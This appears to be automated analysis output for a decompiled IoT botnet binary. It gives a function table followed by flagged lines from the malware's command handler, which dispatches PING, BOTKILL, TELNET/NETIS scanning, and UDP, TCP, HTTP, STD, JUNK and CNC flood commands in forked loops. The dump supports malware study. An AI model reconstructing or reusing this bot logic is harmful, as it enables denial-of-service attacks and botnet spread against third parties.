----------------------------------------------------------------------------------------------
bcopy                                             |3   |135     |0             |0           |
----------------------------------------------------------------------------------------------
hstrerror                                         |1   |142     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |0   |273     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |162     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |3   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |0   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |136     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |3   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |146     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |4   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |207     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |135     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |3   |146     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |135     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |1   |135     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
malloc_trim                                       |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |5   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |167     |0             |0           |
----------------------------------------------------------------------------------------------
access                                            |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |137     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |0   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |2   |149     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |187     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |148     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |142     |0             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |3   |280     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |4   |221     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__get_pc_thunk_bx                                 |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |4   |314     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |193     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |0   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |2   |136     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |134     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |3   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |5   |146     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |1   |153     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |3   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |1   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |4   |146     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |137     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |0   |139     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |5   |149     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |166     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |4   |233     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |0   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |153     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |146     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |201     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |0   |137     |0             |0           |
----------------------------------------------------------------------------------------------
free                                              |1   |331     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |187     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |139     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
mmap                                              |8   |138     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |0   |145     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |1   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |4   |229     |0             |0           |
----------------------------------------------------------------------------------------------
function_8048120                                  |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_trim                                     |0   |176     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |149     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |4   |350     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |149     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |1   |139     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_largebin_index                           |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |176     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |4   |146     |0             |0           |
----------------------------------------------------------------------------------------------
munmap                                            |4   |147     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 13731
++++++++ FUNCTION END 24140
++++++++ FUNCTION LENGTH 10409
    int32_t v132 = ((int32_t)(v130 | _strncmp((char *)v128, "PING", 5) % 2 == 0) | v131 & -256) ^ 1; // 0x804f42b
        int32_t v136 = ((int32_t)(v135 | _strncmp((char *)v134, "GETLOCALIP", 11) % 2 == 0) | v132 & -256) ^ 1; // 0x804f48d
            int32_t v139 = ((int32_t)(v138 | _strncmp((char *)v137, "BOTKILL", 8) % 2 == 0) | v136 & -256) ^ 1; // 0x804f502
                if (listFork() == 0) {
                    HackerPrint(v133, (int32_t)"Killing Bots");
                    botkiller();
                if (listFork() == 0) {
                    HackerPrint(v133, (int32_t)"LOOPING PAYLOAD");
            int32_t v145 = ((int32_t)(v144 | _strncmp((char *)v143, "TELNET", 7) % 2 == 0) | v142 & -256) ^ 1; // 0x804f5f1
                v202 = _strncmp((char *)*v127, "NETIS", 6);
                        HackerPrint(v133, (int32_t)"[NETIS] SCANNER Starting");
                        StartTheNetis();
                        v210 = _strncmp((char *)*v127, "UDP", 4);
                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                            v280 = _strncmp((char *)*v127, "TCP", 4);
                                                    while (true) {
                                                            if (*v298 != __libc_getpid()) {
                                                                kill(v300, 9);
                                                                        v260 = listFork();
                                                                            sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v301, v270, v271, v272, (char *)v276, v257, v258);
                                                                                while (true) {
                                                                            while (true) {
                                                        result5 = listFork();
                                                            sendSTD(v253, (int16_t)v251, v252);
                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                while (true) {
                                                                                    v260 = listFork();
                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                        while (true) {
                                                    while (true) {
                                                        if (listFork() == 0) {
                                                            sendSTD(v303, (int16_t)v251, v252);
                                                    v280 = _strncmp((char *)*v127, "TCP", 4);
                                                            while (true) {
                                                                                v260 = listFork();
                                                                                    sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                    while (true) {
                                                    if (listFork() == 0) {
                                                        sendJUNK(v242, v240, v241);
                                                        sendSTD(v242, (int16_t)v240, v241);
                                                        sendHOLD(v242, v240, v241);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendJUNK(v233, v240, v241);
                                                                sendSTD(v233, (int16_t)v240, v241);
                                                                sendHOLD(v233, v240, v241);
                                                                __libc_close(v133);
                                                            v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                    while (true) {
                                                                                        v260 = listFork();
                                                                                            sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                            while (true) {
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                while (true) {
                                                                                                    v260 = listFork();
                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        while (true) {
                                                                    result5 = listFork();
                                                                        sendSTD(v253, (int16_t)v251, v252);
                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                        while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        while (true) {
                                                    if (listFork() == 0) {
                                                        sendCNC(v229, v227, v228);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendCNC(v306, v227, v228);
                                                                __libc_close(v133);
                                                                v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                        while (true) {
                                                                                            v260 = listFork();
                                                                                                sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                while (true) {
                                                                                result5 = listFork();
                                                                                    sendSTD(v253, (int16_t)v251, v252);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v254, (int16_t)v251, v252);
                                                                                v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v260 = listFork();
                                                                                                                sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                while (true) {
                                                                            v235 = listFork();
                                                                                sendJUNK(v242, v240, v241);
                                                                                sendSTD(v242, (int16_t)v240, v241);
                                                                                sendHOLD(v242, v240, v241);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v233, v240, v241);
                                                                                    sendSTD(v233, (int16_t)v240, v241);
                                                                                    sendHOLD(v233, v240, v241);
                                                                                    __libc_close(v133);
                                                                                v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v260 = listFork();
                                                                                                                sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                while (true) {
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v253, (int16_t)v251, v252);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v254, (int16_t)v251, v252);
                                                                                                v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                        while (true) {
                                                                                                                            v260 = listFork();
                                                                                                                                sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                                while (true) {
                                                            v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                            while (true) {
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v253, (int16_t)v251, v252);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendSTD(v254, (int16_t)v251, v252);
                                                                            v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v242, v240, v241);
                                                                            sendSTD(v242, (int16_t)v240, v241);
                                                                            sendHOLD(v242, v240, v241);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v233, v240, v241);
                                                                                sendSTD(v233, (int16_t)v240, v241);
                                                                                sendHOLD(v233, v240, v241);
                                                                                __libc_close(v133);
                                                                            v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v253, (int16_t)v251, v252);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v254, (int16_t)v251, v252);
                                                                                            v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                        if (listFork() == 0) {
                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                    v260 = listFork();
                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                        result5 = listFork();
                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                    v260 = listFork();
                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                    v235 = listFork();
                                                                        sendJUNK(v242, v240, v241);
                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                        sendHOLD(v242, v240, v241);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendJUNK(v233, v240, v241);
                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                            sendHOLD(v233, v240, v241);
                                                                            __libc_close(v133);
                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                    v260 = listFork();
                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                                    v260 = listFork();
                                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                v218 = listFork();
                                                                    sendCNC(v229, v227, v228);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendCNC(v230, v227, v228);
                                                                        __libc_close(v133);
                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                    v260 = listFork();
                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                                    v260 = listFork();
                                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                    v235 = listFork();
                                                                                        sendJUNK(v242, v240, v241);
                                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                                        sendHOLD(v242, v240, v241);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v233, v240, v241);
                                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                                            sendHOLD(v233, v240, v241);
                                                                                            __libc_close(v133);
                                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                                    v260 = listFork();
                                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                                                        v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                                                    v260 = listFork();
                                                                                                                                        sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                    v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                    if (listFork() == 0) {
                                                                        sendSTD(v253, (int16_t)v251, v252);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendSTD(v254, (int16_t)v251, v252);
                                                                    v280 = _strncmp((char *)*v127, "TCP", 4);
                                                                                                if (listFork() == 0) {
                                                                                                    sendTCP(v275, v270, v271, v272, (char *)v276, v257, v258);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v242, v240, v241);
                                                                    sendSTD(v242, (int16_t)v240, v241);
                                                                    sendHOLD(v242, v240, v241);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v233, v240, v241);
                                                                        sendSTD(v233, (int16_t)v240, v241);
                                                                        sendHOLD(v233, v240, v241);
                                                                        __libc_close(v133);
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v253, (int16_t)v251, v252);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v254, (int16_t)v251, v252);
                                                            if (listFork() == 0) {
                                                                sendCNC(v229, v227, v228);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendCNC(v230, v227, v228);
                                                                    __libc_close(v133);
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v253, (int16_t)v251, v252);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v254, (int16_t)v251, v252);
                                                                                if (listFork() == 0) {
                                                                                    sendJUNK(v242, v240, v241);
                                                                                    sendSTD(v242, (int16_t)v240, v241);
                                                                                    sendHOLD(v242, v240, v241);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendJUNK(v233, v240, v241);
                                                                                        sendSTD(v233, (int16_t)v240, v241);
                                                                                        sendHOLD(v233, v240, v241);
                                                                                        __libc_close(v133);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v253, (int16_t)v251, v252);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v254, (int16_t)v251, v252);
                                                            if (listFork() == 0) {
                                                                sendUDP(v189, v172, v173, v174, v175, v148);
                                                                while (true) {
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v310, v172, v173, v174, v175, v148);
                                                                v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v253, (int16_t)v251, v252);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v254, (int16_t)v251, v252);
                                                                                            v235 = listFork();
                                                                                                sendJUNK(v242, v240, v241);
                                                                                                sendSTD(v242, (int16_t)v240, v241);
                                                                                                sendHOLD(v242, v240, v241);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v233, v240, v241);
                                                                                                    sendSTD(v233, (int16_t)v240, v241);
                                                                                                    sendHOLD(v233, v240, v241);
                                                                                                    __libc_close(v133);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v253, (int16_t)v251, v252);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v254, (int16_t)v251, v252);
                                                                                        v218 = listFork();
                                                                                            sendCNC(v229, v227, v228);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v230, v227, v228);
                                                                                                __libc_close(v133);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v253, (int16_t)v251, v252);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v254, (int16_t)v251, v252);
                                                                                                            v235 = listFork();
                                                                                                                sendJUNK(v242, v240, v241);
                                                                                                                sendSTD(v242, (int16_t)v240, v241);
                                                                                                                sendHOLD(v242, v240, v241);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v233, v240, v241);
                                                                                                                    sendSTD(v233, (int16_t)v240, v241);
                                                                                                                    sendHOLD(v233, v240, v241);
                                                                                                                    __libc_close(v133);
                                                                                                                                result5 = listFork();
                                                                                                                                    sendSTD(v253, (int16_t)v251, v252);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendSTD(v254, (int16_t)v251, v252);
                                                                            v216 = listFork();
                                                                                sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                                                    v235 = listFork();
                                                                                                        sendJUNK(v242, v240, v241);
                                                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                                                        sendHOLD(v242, v240, v241);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v233, v240, v241);
                                                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                                                            sendHOLD(v233, v240, v241);
                                                                                                            __libc_close(v133);
                                                                                                                        result5 = listFork();
                                                                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                                                v218 = listFork();
                                                                                                    sendCNC(v229, v227, v228);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v230, v227, v228);
                                                                                                        __libc_close(v133);
                                                                                                                        result5 = listFork();
                                                                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                                                                                    v235 = listFork();
                                                                                                                        sendJUNK(v242, v240, v241);
                                                                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                                                                        sendHOLD(v242, v240, v241);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v233, v240, v241);
                                                                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                                                                            sendHOLD(v233, v240, v241);
                                                                                                                            __libc_close(v133);
                                                                                                                                        result5 = listFork();
                                                                                                                                            sendSTD(v253, (int16_t)v251, v252);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() != 0) {
                                                                                                                                                sendSTD(v254, (int16_t)v251, v252);
                                                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v253, (int16_t)v251, v252);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v254, (int16_t)v251, v252);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v242, v240, v241);
                                                                                            sendSTD(v242, (int16_t)v240, v241);
                                                                                            sendHOLD(v242, v240, v241);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v233, v240, v241);
                                                                                                sendSTD(v233, (int16_t)v240, v241);
